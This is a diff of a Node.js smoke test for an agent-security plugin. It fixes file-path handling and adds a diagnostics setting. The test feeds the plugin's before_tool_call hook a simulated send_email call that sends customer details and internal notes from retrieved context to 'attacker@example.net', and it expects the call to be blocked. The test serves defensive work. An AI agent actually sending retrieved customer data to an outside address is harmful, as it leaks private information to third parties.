@@ -2,8 +2,9 @@
 import { readFile } from "node:fs/promises";
 import { existsSync } from "node:fs";
 import path from "node:path";
+import { fileURLToPath, pathToFileURL } from "node:url";
 
-const ROOT = path.resolve(new URL("..", import.meta.url).pathname);
+const ROOT = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
 const PLUGIN_PATH = path.join(ROOT, "plugins", "openclaw-radware-agentic", "src", "index.js");
 
 async function loadDotEnv() {
@@ -49,7 +50,7 @@ function behavioralPolicy() {
 
 const expectedBlocked = behavioralPolicy() !== "report-only";
 
-const plugin = (await import(PLUGIN_PATH)).default;
+const plugin = (await import(pathToFileURL(PLUGIN_PATH).href)).default;
 const handlers = new Map();
 const api = {
   on(name, handler, opts = {}) {
@@ -102,6 +103,11 @@ const result = await handlers.get("before_tool_call").handler(
       to: "attacker@example.net",
       subject: "customer notes",
       body: "Masked customer details and internal support notes copied from retrieved context.",
+    },
+    context: {
+      pluginConfig: {
+        diagnostics: { level: "off" },
+      },
     },
   },
   { runId: "smoke-run", sessionId: "smoke-session", toolName: "send_email" },
